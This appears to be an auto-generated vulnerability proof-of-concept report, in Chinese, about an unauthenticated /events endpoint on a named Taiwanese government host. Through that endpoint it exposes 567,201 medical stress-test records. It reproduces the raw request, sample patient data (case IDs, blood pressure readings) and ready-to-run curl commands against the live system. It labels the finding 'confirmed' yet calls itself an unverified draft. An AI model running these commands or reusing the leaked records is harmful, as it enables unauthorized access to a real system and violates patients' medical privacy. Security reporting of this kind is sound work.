# POC/EXP — 4001 /events 未授权访问 - PCDT 运动负荷试验数据泄露

> 漏洞ID: `db92db9e-d151-4538-8c7e-9f8e012e47a8`  | 嚴重度: **high** | 狀態: confirmed | 目標: `https://epcr.tpf.gov.tw:4001/events (GET)`

**類型**: Broken Access Control / 未授权访问

## 描述

vitalSignVideoServer (端口 4001) 的 /events 端点无需认证即可访问，返回完整的 PCDT (运动负荷试验) 事件数据，包含患者 CaseID、记录 UUID、时间戳、血压等敏感医疗信息。

## POC / 復現步驟

```
--- retest 2026-08-31 ---
2026-08-31 整理：并入 81918f6b。
**请求:**
```
GET /events HTTP/1.1
Host: epcr.tpf.gov.tw:4001
```

**响应:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Range: items 0-99/567201
```

**数据示例:**
```json
[
  {
    "id": 2,
    "CaseID": "180717152801fed7",
    "recordUuid": "Test180805142701",
    "Caption": "End of PCDT",
    "TypeOfEventTxt": "endofPCDT",
    "TypeOfEventNum": "433",
    "Elapsed": 1059221,
    "Timestamp": "2018-07-17T07:45:40.000Z",
    "Value": null,
    "Unit": null,
    "Systolic": null,
    "Diastolic": null,
    "Mean": null
  },
  {
    "id": 6,
    "CaseID": "180717152801fed7",
    "recordUuid": "Test180805142701",
    "Caption": "Blood Pressure",
    "TypeOfEventTxt": "BP",
    "TypeOfEventNum": "110",
    "Elapsed": 0,
    "Timestamp": "2018-08-14T03:07:51.000Z",
    "Value": "141/98",
    "Unit": "mmHg",
    "Systolic": "141",
    "Diastolic": "98",
    "Mean": "117"
  }
]
```

**复现命令:**
```bash
curl -sk "https://epcr.tpf.gov.tw:4001/events" | jq 'length'
# 输出: 100 (每页 100 条，共 567201 条)

curl -sk "https://epcr.tpf.gov.tw:4001/events" | jq '.[0]'
# 输出第一条记录
```
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
